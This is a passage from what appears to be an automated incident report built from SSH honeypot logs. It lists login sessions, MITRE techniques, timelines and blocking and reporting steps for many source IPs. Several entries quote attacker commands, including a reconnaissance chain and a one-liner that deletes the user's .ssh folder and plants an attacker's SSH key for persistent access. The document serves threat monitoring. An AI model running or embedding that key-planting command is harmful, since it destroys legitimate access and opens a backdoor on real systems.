| `2026-07-28 15:13:56` | `cowrie.command.success` |
| `2026-07-28 15:13:56` | `cowrie.command.input` |
| `2026-07-28 15:13:56` | `cowrie.command.input` |
| `2026-07-28 15:13:56` | `cowrie.command.input` |
| `2026-07-28 15:13:56` | `cowrie.command.input` |
| `2026-07-28 15:13:56` | `cowrie.log.closed` |
| `2026-07-28 15:13:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-689028c2b03c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 15:15 |
| **Last Seen** | 2026-07-28 15:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:15:14` | `cowrie.session.connect` |
| `2026-07-28 15:15:15` | `cowrie.client.version` |
| `2026-07-28 15:15:15` | `cowrie.client.kex` |
| `2026-07-28 15:15:15` | `cowrie.login.success` |
| `2026-07-28 15:15:16` | `cowrie.session.params` |
| `2026-07-28 15:15:16` | `cowrie.command.input` |
| `2026-07-28 15:15:16` | `cowrie.command.input` |
| `2026-07-28 15:15:16` | `cowrie.command.input` |
| `2026-07-28 15:15:16` | `cowrie.command.input` |
| `2026-07-28 15:15:16` | `cowrie.command.input` |
| `2026-07-28 15:15:16` | `cowrie.command.success` |
| `2026-07-28 15:15:16` | `cowrie.command.input` |
| `2026-07-28 15:15:16` | `cowrie.command.input` |
| `2026-07-28 15:15:16` | `cowrie.command.input` |
| `2026-07-28 15:15:16` | `cowrie.command.input` |
| `2026-07-28 15:15:17` | `cowrie.log.closed` |
| `2026-07-28 15:15:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-494505cf5a4d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-28 15:15 |
| **Last Seen** | 2026-07-28 15:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:15:15` | `cowrie.session.connect` |
| `2026-07-28 15:15:15` | `cowrie.client.version` |
| `2026-07-28 15:15:15` | `cowrie.client.kex` |
| `2026-07-28 15:15:15` | `cowrie.login.success` |
| `2026-07-28 15:15:15` | `cowrie.direct-tcpip.request` |
| `2026-07-28 15:15:15` | `cowrie.direct-tcpip.data` |
| `2026-07-28 15:15:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea05b73ca41c

| Field | Detail |
|---|---|
| **Source IP** | `50.62.22[.]47` |
| **First Seen** | 2026-07-28 15:15 |
| **Last Seen** | 2026-07-28 15:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:15:51` | `cowrie.session.connect` |
| `2026-07-28 15:15:51` | `cowrie.client.version` |
| `2026-07-28 15:15:51` | `cowrie.client.kex` |
| `2026-07-28 15:15:51` | `cowrie.login.success` |
| `2026-07-28 15:15:52` | `cowrie.session.params` |
| `2026-07-28 15:15:52` | `cowrie.command.input` |
| `2026-07-28 15:15:52` | `cowrie.command.failed` |
| `2026-07-28 15:15:52` | `cowrie.log.closed` |
| `2026-07-28 15:15:53` | `cowrie.session.params` |
| `2026-07-28 15:15:53` | `cowrie.command.input` |
| `2026-07-28 15:15:53` | `cowrie.session.file_download` |
| `2026-07-28 15:15:53` | `cowrie.log.closed` |
| `2026-07-28 15:15:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.62.22[.]47` to AbuseIPDB if not already reported
- [ ] Block `50.62.22[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40bca7735e12

| Field | Detail |
|---|---|
| **Source IP** | `50.62.22[.]47` |
| **First Seen** | 2026-07-28 15:15 |
| **Last Seen** | 2026-07-28 15:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:15:53` | `cowrie.session.connect` |
| `2026-07-28 15:15:53` | `cowrie.client.version` |
| `2026-07-28 15:15:53` | `cowrie.client.kex` |
| `2026-07-28 15:15:53` | `cowrie.login.success` |
| `2026-07-28 15:15:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.62.22[.]47` to AbuseIPDB if not already reported
- [ ] Block `50.62.22[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22ff187b4cf3

| Field | Detail |
|---|---|
| **Source IP** | `50.62.22[.]47` |
| **First Seen** | 2026-07-28 15:15 |
| **Last Seen** | 2026-07-28 15:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:15:53` | `cowrie.session.connect` |
| `2026-07-28 15:15:53` | `cowrie.client.version` |
| `2026-07-28 15:15:53` | `cowrie.client.kex` |
| `2026-07-28 15:15:54` | `cowrie.login.success` |
| `2026-07-28 15:15:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.62.22[.]47` to AbuseIPDB if not already reported
- [ ] Block `50.62.22[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d71395685a04

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 15:16 |
| **Last Seen** | 2026-07-28 15:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:16:37` | `cowrie.session.connect` |
| `2026-07-28 15:16:37` | `cowrie.client.version` |
| `2026-07-28 15:16:37` | `cowrie.client.kex` |
| `2026-07-28 15:16:38` | `cowrie.login.success` |
| `2026-07-28 15:16:38` | `cowrie.session.params` |
| `2026-07-28 15:16:38` | `cowrie.command.input` |
| `2026-07-28 15:16:38` | `cowrie.command.input` |
| `2026-07-28 15:16:38` | `cowrie.command.input` |
| `2026-07-28 15:16:38` | `cowrie.command.input` |
| `2026-07-28 15:16:38` | `cowrie.command.input` |
| `2026-07-28 15:16:38` | `cowrie.command.success` |
| `2026-07-28 15:16:38` | `cowrie.command.input` |
| `2026-07-28 15:16:38` | `cowrie.command.input` |
| `2026-07-28 15:16:38` | `cowrie.command.input` |
| `2026-07-28 15:16:38` | `cowrie.command.input` |
| `2026-07-28 15:16:39` | `cowrie.log.closed` |
| `2026-07-28 15:16:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb9cad96c094

| Field | Detail |
|---|---|
| **Source IP** | `137.255.13[.]53` |
| **First Seen** | 2026-07-28 15:16 |
| **Last Seen** | 2026-07-28 15:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:16:53` | `cowrie.session.connect` |
| `2026-07-28 15:16:53` | `cowrie.client.version` |
| `2026-07-28 15:16:53` | `cowrie.client.kex` |
| `2026-07-28 15:16:54` | `cowrie.login.success` |
| `2026-07-28 15:16:55` | `cowrie.session.params` |
| `2026-07-28 15:16:55` | `cowrie.command.input` |
| `2026-07-28 15:16:55` | `cowrie.command.failed` |
| `2026-07-28 15:16:55` | `cowrie.log.closed` |
| `2026-07-28 15:16:56` | `cowrie.session.params` |
| `2026-07-28 15:16:56` | `cowrie.command.input` |
| `2026-07-28 15:16:56` | `cowrie.session.file_download` |
| `2026-07-28 15:16:56` | `cowrie.log.closed` |
| `2026-07-28 15:16:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `137.255.13[.]53` to AbuseIPDB if not already reported
- [ ] Block `137.255.13[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66106a43b19e

| Field | Detail |
|---|---|
| **Source IP** | `137.255.13[.]53` |
| **First Seen** | 2026-07-28 15:16 |
| **Last Seen** | 2026-07-28 15:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:16:57` | `cowrie.session.connect` |
| `2026-07-28 15:16:57` | `cowrie.client.version` |
| `2026-07-28 15:16:57` | `cowrie.client.kex` |
| `2026-07-28 15:16:58` | `cowrie.login.success` |
| `2026-07-28 15:16:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `137.255.13[.]53` to AbuseIPDB if not already reported
- [ ] Block `137.255.13[.]53` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62ddf8323242

| Field | Detail |
|---|---|
| **Source IP** | `137.255.13[.]53` |
| **First Seen** | 2026-07-28 15:16 |
| **Last Seen** | 2026-07-28 15:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:16:58` | `cowrie.session.connect` |
| `2026-07-28 15:16:58` | `cowrie.client.version` |
| `2026-07-28 15:16:58` | `cowrie.client.kex` |
| `2026-07-28 15:16:59` | `cowrie.login.success` |
| `2026-07-28 15:16:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `137.255.13[.]53` to AbuseIPDB if not already reported
- [ ] Block `137.255.13[.]53` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c4d83449847

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 15:17 |
| **Last Seen** | 2026-07-28 15:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:17:57` | `cowrie.session.connect` |
| `2026-07-28 15:17:57` | `cowrie.client.version` |
| `2026-07-28 15:17:57` | `cowrie.client.kex` |
| `2026-07-28 15:17:58` | `cowrie.login.success` |
| `2026-07-28 15:17:59` | `cowrie.session.params` |
| `2026-07-28 15:17:59` | `cowrie.command.input` |
| `2026-07-28 15:17:59` | `cowrie.command.input` |
| `2026-07-28 15:17:59` | `cowrie.command.input` |
| `2026-07-28 15:17:59` | `cowrie.command.input` |
| `2026-07-28 15:17:59` | `cowrie.command.input` |
| `2026-07-28 15:17:59` | `cowrie.command.success` |
| `2026-07-28 15:17:59` | `cowrie.command.input` |
| `2026-07-28 15:17:59` | `cowrie.command.input` |
| `2026-07-28 15:17:59` | `cowrie.command.input` |
| `2026-07-28 15:17:59` | `cowrie.command.input` |
| `2026-07-28 15:17:59` | `cowrie.log.closed` |
| `2026-07-28 15:17:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f51001cad8b4

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 15:19 |
| **Last Seen** | 2026-07-28 15:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:19:11` | `cowrie.session.connect` |
| `2026-07-28 15:19:11` | `cowrie.client.version` |
| `2026-07-28 15:19:11` | `cowrie.client.kex` |
| `2026-07-28 15:19:12` | `cowrie.login.success` |
| `2026-07-28 15:19:14` | `cowrie.session.params` |
| `2026-07-28 15:19:14` | `cowrie.command.input` |
| `2026-07-28 15:19:14` | `cowrie.command.input` |
| `2026-07-28 15:19:14` | `cowrie.command.input` |
| `2026-07-28 15:19:14` | `cowrie.command.input` |
| `2026-07-28 15:19:14` | `cowrie.command.input` |
| `2026-07-28 15:19:14` | `cowrie.command.success` |
| `2026-07-28 15:19:14` | `cowrie.command.input` |
| `2026-07-28 15:19:14` | `cowrie.command.input` |
| `2026-07-28 15:19:14` | `cowrie.command.input` |
| `2026-07-28 15:19:14` | `cowrie.command.input` |
| `2026-07-28 15:19:14` | `cowrie.log.closed` |
| `2026-07-28 15:19:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a1a2b3db21f

| Field | Detail |
|---|---|
| **Source IP** | `171.217.70[.]151` |
| **First Seen** | 2026-07-28 15:19 |
| **Last Seen** | 2026-07-28 15:19 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:19:42` | `cowrie.session.connect` |
| `2026-07-28 15:19:43` | `cowrie.client.version` |
| `2026-07-28 15:19:43` | `cowrie.client.kex` |
| `2026-07-28 15:19:48` | `cowrie.login.success` |
| `2026-07-28 15:19:48` | `cowrie.direct-tcpip.request` |
| `2026-07-28 15:19:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.217.70[.]151` to AbuseIPDB if not already reported
- [ ] Block `171.217.70[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31663bd6663d

| Field | Detail |
|---|---|
| **Source IP** | `145.249.109[.]110` |
| **First Seen** | 2026-07-28 15:29 |
| **Last Seen** | 2026-07-28 15:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:29:40` | `cowrie.session.connect` |
| `2026-07-28 15:29:40` | `cowrie.client.version` |
| `2026-07-28 15:29:40` | `cowrie.client.kex` |
| `2026-07-28 15:29:41` | `cowrie.login.success` |
| `2026-07-28 15:29:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `145.249.109[.]110` to AbuseIPDB if not already reported
- [ ] Block `145.249.109[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05f841022da5

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-28 15:29 |
| **Last Seen** | 2026-07-28 15:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:29:42` | `cowrie.session.connect` |
| `2026-07-28 15:29:42` | `cowrie.client.version` |
| `2026-07-28 15:29:42` | `cowrie.client.kex` |
| `2026-07-28 15:29:42` | `cowrie.login.success` |
| `2026-07-28 15:29:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40e30793869d

| Field | Detail |
|---|---|
| **Source IP** | `58.22.255[.]28` |
| **First Seen** | 2026-07-28 15:33 |
| **Last Seen** | 2026-07-28 15:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:33:33` | `cowrie.session.connect` |
| `2026-07-28 15:33:34` | `cowrie.client.version` |
| `2026-07-28 15:33:34` | `cowrie.client.kex` |
| `2026-07-28 15:33:37` | `cowrie.login.success` |
| `2026-07-28 15:33:38` | `cowrie.direct-tcpip.request` |
| `2026-07-28 15:33:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.22.255[.]28` to AbuseIPDB if not already reported
- [ ] Block `58.22.255[.]28` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b68e9aa71674

| Field | Detail |
|---|---|
| **Source IP** | `61.184.128[.]210` |
| **First Seen** | 2026-07-28 15:33 |
| **Last Seen** | 2026-07-28 15:33 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:33:43` | `cowrie.session.connect` |
| `2026-07-28 15:33:45` | `cowrie.client.version` |
| `2026-07-28 15:33:45` | `cowrie.client.kex` |
| `2026-07-28 15:33:47` | `cowrie.login.success` |
| `2026-07-28 15:33:48` | `cowrie.direct-tcpip.request` |
| `2026-07-28 15:33:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.184.128[.]210` to AbuseIPDB if not already reported
- [ ] Block `61.184.128[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9790e3739174

| Field | Detail |
|---|---|
| **Source IP** | `218.29.196[.]162` |
| **First Seen** | 2026-07-28 15:37 |
| **Last Seen** | 2026-07-28 15:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:37:01` | `cowrie.session.connect` |
| `2026-07-28 15:37:02` | `cowrie.client.version` |
| `2026-07-28 15:37:02` | `cowrie.client.kex` |
| `2026-07-28 15:37:04` | `cowrie.login.success` |
| `2026-07-28 15:37:05` | `cowrie.direct-tcpip.request` |
| `2026-07-28 15:37:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.29.196[.]162` to AbuseIPDB if not already reported
- [ ] Block `218.29.196[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f09ab793fbc

| Field | Detail |
|---|---|
| **Source IP** | `95.79.108[.]51` |
| **First Seen** | 2026-07-28 15:37 |
| **Last Seen** | 2026-07-28 15:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:37:10` | `cowrie.session.connect` |
| `2026-07-28 15:37:10` | `cowrie.client.version` |
| `2026-07-28 15:37:10` | `cowrie.client.kex` |
| `2026-07-28 15:37:11` | `cowrie.login.success` |
| `2026-07-28 15:37:12` | `cowrie.direct-tcpip.request` |
| `2026-07-28 15:37:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.79.108[.]51` to AbuseIPDB if not already reported
- [ ] Block `95.79.108[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab7e5384d2fd

| Field | Detail |
|---|---|
| **Source IP** | `113.140.95[.]250` |
| **First Seen** | 2026-07-28 15:38 |
| **Last Seen** | 2026-07-28 15:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:38:17` | `cowrie.session.connect` |
| `2026-07-28 15:38:19` | `cowrie.client.version` |
| `2026-07-28 15:38:19` | `cowrie.client.kex` |
| `2026-07-28 15:38:21` | `cowrie.login.success` |
| `2026-07-28 15:38:22` | `cowrie.direct-tcpip.request` |
| `2026-07-28 15:38:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.140.95[.]250` to AbuseIPDB if not already reported
- [ ] Block `113.140.95[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f129a79b9a33

| Field | Detail |
|---|---|
| **Source IP** | `117.222.6[.]204` |
| **First Seen** | 2026-07-28 15:38 |
| **Last Seen** | 2026-07-28 15:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
